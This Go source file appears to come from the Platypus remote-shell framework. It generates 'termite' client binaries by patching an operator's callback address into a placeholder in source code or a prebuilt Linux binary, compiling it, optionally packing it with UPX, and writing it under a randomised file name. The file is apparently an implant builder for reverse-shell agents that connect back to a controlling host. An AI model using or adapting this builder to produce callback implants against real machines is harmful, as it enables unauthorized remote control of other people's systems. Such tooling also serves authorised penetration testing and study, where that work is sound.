package compiler

import (
	"bytes"
	"errors"
	"fmt"
	"io/ioutil"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/WangYihang/Platypus/lib/util/log"
	"github.com/WangYihang/Platypus/lib/util/resource"
	"github.com/WangYihang/Platypus/lib/util/str"
)

func Compile(target string) bool {
	log.Success("Start building: %s", target)
	output, err := exec.Command("go", "build", "-o", target, "termite.go").Output()
	if err != nil {
		log.Error("Build failed: %s", err)
		return false
	}
	log.Success("Build (%s) success: %s", target, output)
	return true
}

func Compress(target string) bool {
	upx, err := exec.LookPath("upx")
	if err != nil {
		log.Error("No upx executable found")
		return false
	}
	log.Success("Upx detected: %s", upx)
	log.Info("Compressing %s via upx", target)
	output, err := exec.Command("upx", "-9", target).Output()
	if err != nil {
		log.Error("Compressing %s failed: %s, %s", target, err, output)
		return false
	}
	log.Success("%s Compressed: %s", target, output)
	return true
}

func BuildTermiteFromSourceCode(targetFilename string, targetAddress string) error {
	content, err := ioutil.ReadFile("termite.go")
	if err != nil {
		log.Error("Can not read termite.go: %s", err)
		return errors.New("can not read termite.go")
	}
	contentString := string(content)
	contentString = strings.Replace(contentString, "xxx.xxx.xxx.xxx:xxxxx", targetAddress, -1)
	err = ioutil.WriteFile("termite.go", []byte(contentString), 0644)
	if err != nil {
		log.Error("Can not write termite.go: %s", err)
		return errors.New("can not write termite.go")
	}

	// Compile termite binary
	if !Compile(targetFilename) {
		log.Error("Can not compile termite.go: %s", err)
		return errors.New("can not compile termite.go")
	}
	return nil
}

func BuildTermiteFromPrebuildAssets(targetFilename string, targetAddress string) error {
	// Step 1: Generating Termite from Assets
	assetFilepath := "termites/termite_linux_amd64"
	content, err := resource.Asset(assetFilepath)
	if err != nil {
		log.Error("Failed to read asset file: %s", assetFilepath)
		return err
	}

	// Step 2: Generating the placeholder
	placeHolder := "xxx.xxx.xxx.xxx:xxxxx"
	replacement := make([]byte, len(placeHolder))
	for i := 0; i < len(targetAddress); i++ {
		replacement[i] = targetAddress[i]
	}

	// Step 3: Replacing the placeholder
	log.Success("Replacing `%s` to: `%s`", placeHolder, replacement)
	content = bytes.Replace(content, []byte(placeHolder), replacement, 1)

	// Step 4: Create binary file
	err = ioutil.WriteFile(targetFilename, content, 0755)
	if err != nil {
		log.Error("Failed to write file: %s", targetFilename)
		return err
	}
	return nil
}

func GenerateDirFilename() (string, string, error) {
	dir, err := ioutil.TempDir("", str.RandomString(0x08))
	if err != nil {
		return "", "", err
	}
	var fileanme string
	if runtime.GOOS == "windows" {
		fileanme = fmt.Sprintf("%d-%s-termite.exe", time.Now().UnixNano(), str.RandomString(0x10))
	} else {
		fileanme = fmt.Sprintf("%d-%s-termite", time.Now().UnixNano(), str.RandomString(0x10))
	}
	filepath := filepath.Join(dir, fileanme)
	return dir, filepath, nil
}
